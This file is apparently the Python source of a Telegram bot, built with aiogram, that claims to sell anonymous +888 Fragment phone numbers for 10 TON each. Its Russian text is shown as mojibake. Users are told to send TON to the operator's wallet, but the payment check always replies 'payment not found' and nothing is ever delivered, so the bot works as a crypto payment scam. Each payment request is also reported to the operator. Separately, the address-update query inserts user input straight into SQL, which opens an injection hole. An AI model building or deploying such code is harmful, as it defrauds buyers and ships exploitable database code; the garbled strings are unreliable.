from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher, FSMContext
from aiogram.utils import executor
from aiogram.types import ReplyKeyboardRemove, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.dispatcher.filters.state import State, StatesGroup

import sqlite3
import random
import json

data = json.load(open('cfg.json'))
token = data['token']
my_address = data['ton_address']
loger_id = data['log_channel']
support = data['support']

profil_kb = InlineKeyboardMarkup().add(InlineKeyboardButton('üëõ –ò–∑–º–µ–Ω–∏—Ç—å –∞–¥—Ä–µ—Å', callback_data='change_address')).add(InlineKeyboardButton('üõí –ò—Å—Ç–æ—Ä–∏—è –ø–æ–∫—É–ø–æ–∫', callback_data='history')).add(InlineKeyboardButton('‚ÅâÔ∏è –¢–µ—Ö. –ü–æ–¥–¥–µ—Ä–∂–∫–∞', callback_data='help'))

start_kb=ReplyKeyboardMarkup(resize_keyboard=True)
start_kb.add(KeyboardButton('üìÅ –ö–∞—Ç–∞–ª–æ–≥'), KeyboardButton('üë§ –ü—Ä–æ—Ñ–∏–ª—å'))
start_kb.add(KeyboardButton('‚ÅâÔ∏è –ü–æ–º–æ—â—å'))

class States(StatesGroup):
    change_address=State()
    change_address1=State()

db = sqlite3.connect("database.sqlite", check_same_thread=False)
sql = db.cursor()

sql.execute("""CREATE TABLE IF NOT EXISTS users (
    id INT PRIMARY KEY,
    address TEXT
)""")
db.commit()

bot = Bot(token=token, parse_mode="HTML")
dp = Dispatcher(bot, storage=MemoryStorage())

async def start_payment(id, nick):
    await bot.send_message(loger_id, f'–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å <b>{nick}</b> —Å–æ–∑–¥–∞–ª –∑–∞—è–≤–∫—É –Ω–∞ –æ–ø–ª–∞—Ç—É', reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton(nick, url=f'tg://openmessage?user_id={id}')))

def get_addrees(id):
    sql.execute(f"SELECT address FROM users WHERE id = {id}")
    row = sql.fetchone()
    try:
        if row[0]==None:
            return '‚ùå –ù–µ —É–∫–∞–∑–∞–Ω!'
    except:
        pass
    if row==None:
        return '‚ùå –ù–µ —É–∫–∞–∑–∞–Ω!'
    else:
        return row[0]

def change_address(id, address):
    sql.execute(f'UPDATE users SET address = "{address}" WHERE id = {id}')
    db.commit()

def dell_user(id):
    sql.execute("DELETE FROM users WHERE id=?", (id,))
    db.commit()

def creat_user(id):
    sql.execute(f"SELECT * FROM users WHERE id = {id}")
    raw = sql.fetchone()
    if raw is None:
        sql.execute(f"INSERT or IGNORE INTO users VALUES (?, ?)", (id, None))
        db.commit()

def get_all_id():
    sql.execute("Select id from users")
    return sql.fetchall()

@dp.message_handler(commands=['start'])
async def start_bot(msg: types.Message):
    creat_user(msg.from_user.id)
    await bot.send_message(msg.from_user.id, f'''
üëã –ü—Ä–∏–≤–µ—Ç, <b>{(msg.from_user.first_name).replace('<', '').replace('>', '').replace('/', '')}</b>
üìû –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –ø–µ—Ä–≤–æ–≥–æ —Ç–µ–ª–µ–≥—Ä–∞–º –±–æ—Ç–∞ –ø–æ –ø—Ä–æ–¥–∞–∂–µ <b>–∞–Ω–æ–Ω–∏–º–Ω—ã—Ö Telegram –Ω–æ–º–µ—Ä–æ–≤</b> –æ—Ç <b>fragment</b>
‚ÅâÔ∏è –ö–∞–∫ –≤—ã –∑–Ω–∞–µ—Ç–µ, —Ü–µ–Ω—ã –Ω–∞ —Ç–∞–∫–∏–µ –Ω–æ–º–µ—Ä–∞ <b>—Ä–∞—Å—Ç—É—Ç</b>, –∞ –≤—Å–∫–æ—Ä–µ –∏—Ö <b>–ø—Ä–æ–¥–∞–∂–∏ –ø—Ä–µ–∫—Ä–∞—Ç—è—Ç—Å—è –Ω–∞ –≤—Å–µ–≥–¥–∞!</b>
üíé –£ –Ω–∞—Å –∂–µ –≤—ã –≤—Å–µ–≥–¥–∞ —Å–º–æ–∂–µ—Ç–µ –ø–æ–∫—É–ø–∞—Ç—å –∞–Ω–æ–Ω–∏–º–Ω—ã–µ <b>+888</b> –Ω–æ–º–µ—Ä–∞ –ø–æ —Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω–æ–π —Ü–µ–Ω–µ <b>10TON</b>
''', reply_markup=start_kb)

@dp.message_handler()
async def message(msg):
    id = msg.from_user.id
    if msg.text=='üë§ –ü—Ä–æ—Ñ–∏–ª—å':
        await bot.send_message(msg.from_user.id, f'''
üë®‚Äçüíº –í–æ—Ç –≤–∞—à –ø—Ä–æ—Ñ–∏–ª—å:
 üë§ –ù–∏–∫: <code>{(msg.from_user.first_name).replace('<', '').replace('>', '').replace('/', '')}</code>
 üî¢ ID: <code>{id}</code>
 üëõ –í–∞—à TON –∞–¥—Ä–µ—Å: <code>{get_addrees(id)}</code>
 üìä  –°–æ–≤–µ—Ä—à–µ–Ω–Ω–æ <b>0</b> –ø–æ–∫—É–ø–æ–∫ –Ω–∞ —Å—É–º–º—É ‚âà<b>0TON</b>
 üî® –ü—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏—è –æ—Ç –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏–∏: <code>0</code>
 üíé –°—Ç–∞—Ç—É—Å: <code>–ù–æ–≤–∏—á–µ–∫</code>
''', reply_markup=profil_kb)
    elif msg.text=='‚ÅâÔ∏è –ü–æ–º–æ—â—å':
        await bot.send_message(id, f'''
üíé –î–∞–Ω–Ω—ã–π –±–æ—Ç —Å–æ–∑–¥–∞–Ω –¥–ª—è –ø—Ä–æ—Å—Ç–æ–π –ø–æ–∫—É–ø–∫–∏ <b>–∞–Ω–æ–Ω–∏–º–Ω—ã—Ö +888 Telegram –Ω–æ–º–µ—Ä–æ–≤</b> –æ—Ç <b>fragment</b>
üí∏ –û–ø–ª–∞—Ç–∞ –æ—Å—É—â–µ—Å—Ç–≤–ª—è–µ—Ç—Å—è <b>–ø—Ä—è–º—ã–º –ø–µ—Ä–µ–≤–æ–¥–æ–º –Ω–∞ TON –∫–æ—à–µ–ª—ë–∫</b>
üñºÔ∏è –ü–æ—Å–ª–µ –æ–ø–ª–∞—Ç—ã –Ω–∞ –≤–∞—à <b>TON –∞–¥—Ä–µ—Å</b> –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ <b>NFT</b> —Å –ø–µ—Ä–µ–¥–∞—á–µ–π –ø—Ä–∞–≤. –û–Ω–∞ –±—É–¥–µ—Ç –≤–∏–¥–Ω–∞ –Ω–∞ —Å–∞–π—Ç–µ <code>https://fragment.com/numbers</code> –∏ –≤—ã —Å–º–æ–∂–µ—Ç–µ –ø—Ä–∏–Ω–∏–º–∞—Ç—å –Ω–∞ –Ω–µ–µ –∫–æ–¥ –∏–ª–∏ –≤—ã—Å—Ç–∞–≤–∏—Ç—å –Ω–∞ –∞—É–∫—Ü–∏–æ–Ω
‚ÅâÔ∏è –ü–æ –≤—Å–µ–º –≤–æ–ø—Ä–æ—Å–∞–º –æ–±—Ä–∞—â–∞—Ç—å—Å—è –∫ –Ω–∞—à–µ–º—É –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É: @{support}
''', reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton('üíé –°—Ç–∞—Ç—É—Å—ã', callback_data='status')))
    elif msg.text=='üìÅ –ö–∞—Ç–∞–ª–æ–≥':
        await bot.send_message(id, 'üíé –í—ã–±–µ—Ä–∏—Ç–µ —Ç–æ–≤–∞—Ä –¥–ª—è –ø–æ–∫—É–ø–∫–∏:', reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton('üìû –°–ª—É—á–∞–π–Ω—ã–π +888 –Ω–æ–º–µ—Ä | 100—à—Ç', callback_data='random_number')).add(InlineKeyboardButton('‚¨ÖÔ∏è –í–µ—Ä–Ω—É—Ç—å—Å—è', callback_data='back_main')))
@dp.callback_query_handler(lambda call: True)
async def handler_call(call: types.CallbackQuery):
    id = call.message.chat.id
    if call.data=='status':
        await bot.send_message(id, '''
üíé –í–æ—Ç –≤—Å–µ –Ω–∞—à–∏ —Å—Ç–∞—Ç—É—Å—ã:
üë§ –ù–æ–≤–∏—á–µ–∫: <b>0 –ø–æ–∫—É–ø–æ–∫</b>
üìû –ü–æ–∫—É–ø–∞—Ç–µ–ª—å: <b>1 –ø–æ–∫—É–ø–∫–∞</b>
üë®‚Äçüíº –ß–∞—Å—Ç–Ω—ã–π –ø–æ–∫—É–ø–∞—Ç–µ–ª—å: <b>3-5 –ø–æ–∫—É–ø–æ–∫</b>
üéÅ  –ú–µ—Å—Ç–Ω—ã–π: <b>10+ –ø–æ–∫—É–ø–æ–∫</b>
''')
    elif call.data=='help':
        await bot.send_message(id, f'‚ÅâÔ∏è –ü–æ –≤—Å–µ–º –≤–æ–ø—Ä–æ—Å–∞–º –æ–±—Ä–∞—â–∞—Ç—å—Å—è –∫ –Ω–∞—à–µ–º—É –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É: @{support}')
    elif call.data=='random_number':
        await call.message.edit_text('''
üéÅ –í—ã –≤—ã–±—Ä–∞–ª–∏ —Ç–æ–≤–∞—Ä: <code>üìû –°–ª—É—á–∞–π–Ω—ã–π +888 –Ω–æ–º–µ—Ä</code>
üìä –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ç–æ–≤–∞—Ä–∞: <code>999 —à—Ç</code>
üíé –ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É <code>üéÅ –ö—É–ø–∏—Ç—å</code> —á—Ç–æ–±—ã –ø–µ—Ä–µ–π—Ç–∏ –∫ –ø–æ–∫—É–ø–∫–µ 
''', reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton('üéÅ –ö—É–ø–∏—Ç—å', callback_data='buy_random_number')).add(InlineKeyboardButton('‚ùå –û—Ç–º–µ–Ω–∏—Ç—å –ø–ª–∞—Ç–µ–∂', callback_data='stop')))
    elif call.data=='buy_random_number':
        await call.message.edit_text('''
üìû –í–∞—à –Ω–æ–º–µ—Ä: <b>+888<tg-spoiler>********</tg-spoiler></b>
üí≥ –ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É <code>üí∏ –û–ø–ª–∞—Ç–∏—Ç—å</code> –¥–ª—è –ø–æ–∫—É–ø–∫–∏
''', reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton('üí∏ –û–ø–ª–∞—Ç–∏—Ç—å', callback_data='confirm_buy_random_number')).add(InlineKeyboardButton('‚ùå –û—Ç–º–µ–Ω–∏—Ç—å –ø–ª–∞—Ç–µ–∂', callback_data='stop')))
    elif call.data=='confirm_buy_random_number':
        await call.message.edit_text('üí∏ –í—ã–±–µ—Ä–∏—Ç–µ –º–µ—Ç–æ–¥ –æ–ø–ª–∞—Ç—ã:', reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton('üíé –ü—Ä—è–º–æ–π –ø–µ—Ä–µ–≤–æ–¥ –Ω–∞ –∞–¥—Ä–µ—Å', callback_data='send_buy_random_number')))
    elif call.data=='send_buy_random_number':
        code = random.randint(99999, 9999999)
        await start_payment(id, call.message.chat.first_name)
        await call.message.edit_text(f'''
üíé –í—ã —Å–æ–∑–¥–∞–ª–∏ –∑–∞—è–≤–∫—É –Ω–∞ –ø–æ–∫—É–ø–∫—É –Ω–æ–º–µ—Ä–∞:
 üí∏ TON –∞–¥—Ä–µ—Å –¥–ª—è –æ–ø–ª–∞—Ç—ã: <code>{my_address}</code>
üí∞ –°—É–º–º–∞: <code>10</code> <b>TON</b>
üî¢ –£–Ω–∏–∫–∞–ª—å–Ω—ã–π –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π(—É–∫–∞–∂–∏—Ç–µ –µ–≥–æ –≤ –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–∏ –∫ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏): <code>{code}</code>
üëõ –í–∞—à TON –∞–¥—Ä–µ—Å(–Ω–∞ –Ω–µ–≥–æ –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ NFT): <code>{get_addrees(id)}</code>
‚ÅâÔ∏è <b>NFT</b> –±—É–¥–µ—Ç –æ—Ç–ø—Ä–≤–ª–µ–Ω–∞ –Ω–∞ —É–∫–∞–∑–∞–Ω–Ω—ã–π –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞—Ö <b>–∞–¥—Ä–µ—Å</b>, –µ—Å–ª–∏ –∂–µ –æ–Ω –Ω–µ —É–∫–∞–∑–∞–Ω, —Ç–æ –Ω–∞ –∞–¥—Ä–µ—Å, <b>—Å –∫–æ—Ç–æ—Ä–æ–≥–æ –ø—Ä–æ–∏–∑–≤–æ–¥–∏–ª–∞—Å—å –æ–ø–ª–∞—Ç–∞</b>!
''', reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton('üîÉ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –æ–ø–ª–∞—Ç—É', callback_data=f'check_payment_{code}')).add(InlineKeyboardButton('‚ùå –û—Ç–º–µ–Ω–∏—Ç—å –ø–ª–∞—Ç–µ–∂', callback_data='stop')))
    elif 'change_address' in call.data:
        await call.message.delete()
        globals()[f'msg_{id}'] = await bot.send_message(id, 'üíé –û—Ç–ø—Ä–∞–≤—å—Ç–µ –≤–∞—à <b>TON –∞–¥—Ä–µ—Å</b> (<b>–Ω–µ –∏–∑ cryptobot!</b>):')
        await States.change_address.set()
    elif 'check_payment' in call.data:
        await bot.answer_callback_query(call.id, '‚ùå –û–ø–ª–∞—Ç–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞!')
    elif call.data=='history':
        await bot.send_message(id, 'üõí –ù–∞ –¥–∞–Ω–Ω—ã–π –º–æ–º–µ–Ω—Ç —É –≤–∞—Å <b>0</b> –ø–æ–∫—É–ø–æ–∫')
    elif call.data=='stop':
        await call.message.delete()
        await bot.send_message(id, 'üíé –í—ã–±–µ—Ä–∏—Ç–µ —Ç–æ–≤–∞—Ä –¥–ª—è –ø–æ–∫—É–ø–∫–∏:', reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton('üìû –°–ª—É—á–∞–π–Ω—ã–π +888 –Ω–æ–º–µ—Ä | 999—à—Ç', callback_data='random_number')).add(InlineKeyboardButton('‚¨ÖÔ∏è –í–µ—Ä–Ω—É—Ç—å—Å—è', callback_data='back_main')))
    elif call.data=='back_main':
        await call.message.delete()
        await bot.send_message(id, f'''
üëã –ü—Ä–∏–≤–µ—Ç, <b>{(call.message.chat.first_name).replace('<', '').replace('>', '').replace('/', '')}</b>
üìû –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –ø–µ—Ä–≤–æ–≥–æ —Ç–µ–ª–µ–≥—Ä–∞–º –±–æ—Ç–∞ –ø–æ –ø—Ä–æ–¥–∞–∂–µ <b>–∞–Ω–æ–Ω–∏–º–Ω—ã—Ö Telegram –Ω–æ–º–µ—Ä–æ–≤</b> –æ—Ç <b>fragment</b>
‚ÅâÔ∏è –ö–∞–∫ –≤—ã –∑–Ω–∞–µ—Ç–µ, —Å–∫–æ—Ä–æ —Ü–µ–Ω—ã –Ω–∞ —Ç–∞–∫–∏–µ –Ω–æ–º–µ—Ä–∞ <b>–Ω–∞—á–Ω—É—Ç —Ä–∞—Å—Ç–∏</b>, –∞ –≤—Å–∫–æ—Ä–µ –∏—Ö <b>–ø—Ä–æ–¥–∞–∂–∏ –ø—Ä–µ–∫—Ä–∞—Ç—è—Ç—Å—è –Ω–∞ –≤—Å–µ–≥–¥–∞!</b>
üíé –£ –Ω–∞—Å –∂–µ –≤—ã –≤—Å–µ–≥–¥–∞ —Å–º–æ–∂–µ—Ç–µ –ø–æ–∫—É–ø–∞—Ç—å –∞–Ω–æ–Ω–∏–º–Ω—ã–µ <b>+888</b> –Ω–æ–º–µ—Ä–∞ –ø–æ —Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω–æ–π —Ü–µ–Ω–µ <b>10 TON</b>
''', reply_markup=start_kb)

@dp.message_handler(content_types=types.ContentType.ANY, state=States.change_address)
async def send_text(msg: types.ContentType.ANY, state: FSMContext):
    await msg.delete()
    await (globals()[f'msg_{msg.from_user.id}']).delete()
    await state.update_data(address=str(msg.text))
    globals().pop(f'msg_{msg.from_user.id}')
    await bot.send_message(msg.from_user.id, f'‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ —Å–º–µ–Ω—É –∞–¥—Ä–µ—Å–∞ –Ω–∞ <code>{msg.text}</code>', reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton('‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å', callback_data='confirm')).add(InlineKeyboardButton('‚ùå –û—Ç–º–µ–Ω–∞', callback_data='cancle')))
    await States.change_address1.set()

@dp.callback_query_handler(lambda call: True, state=States.change_address1)
async def handler_call(call: types.CallbackQuery, state: FSMContext):
    id = call.message.chat.id
    await call.message.delete()
    if call.data=='confirm':
        address = str((await state.get_data())['address'])
        change_address(id, address)
        await bot.send_message(id, f'‚úÖ –í–∞—à –∞–¥—Ä–µ—Å —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω–µ–Ω –Ω–∞ <code>{address}</code>')
        await bot.send_message(id, f'''
üë®‚Äçüíº –í–æ—Ç –≤–∞—à –ø—Ä–æ—Ñ–∏–ª—å:
üë§ –ù–∏–∫: <code>{(call.message.chat.first_name).replace('<', '').replace('>', '').replace('/', '')}</code>
üî¢ ID: <code>{id}</code>
üëõ –í–∞—à TON –∞–¥—Ä–µ—Å: <code>{get_addrees(id)}</code>
üìä  –°–æ–≤–µ—Ä—à–µ–Ω–Ω–æ <b>0</b> –ø–æ–∫—É–ø–æ–∫ –Ω–∞ —Å—É–º–º—É ‚âà<b>0TON</b>
üî® –ü—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏—è –æ—Ç –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏–∏: <code>0</code>
üíé –°—Ç–∞—Ç—É—Å: <code>–ù–æ–≤–∏—á–µ–∫</code>
''', reply_markup=profil_kb)
    elif call.data=='cancel':
        await bot.send_message(id, f'‚ùå –û–ø–µ—Ä–∞—Ü–∏—è –æ—Ç–º–µ–Ω–µ–Ω–∞')
        await bot.send_message(id, f'''
üë®‚Äçüíº –í–æ—Ç –≤–∞—à –ø—Ä–æ—Ñ–∏–ª—å:
üë§ –ù–∏–∫: <code>{(call.message.chat.first_name).replace('<', '').replace('>', '').replace('/', '')}</code>
üî¢ ID: <code>{id}</code>
üëõ –í–∞—à TON –∞–¥—Ä–µ—Å: <code>{get_addrees(id)}</code>
üìä  –°–æ–≤–µ—Ä—à–µ–Ω–Ω–æ <b>0</b> –ø–æ–∫—É–ø–æ–∫ –Ω–∞ —Å—É–º–º—É ‚âà<b>0TON</b>
üî® –ü—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏—è –æ—Ç –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏–∏: <code>0</code>
üíé –°—Ç–∞—Ç—É—Å: <code>–ù–æ–≤–∏—á–µ–∫</code>
''', reply_markup=profil_kb)
    return await state.finish()

if __name__ == '__main__':
        try:
            executor.start_polling(dp)
        except:
            pass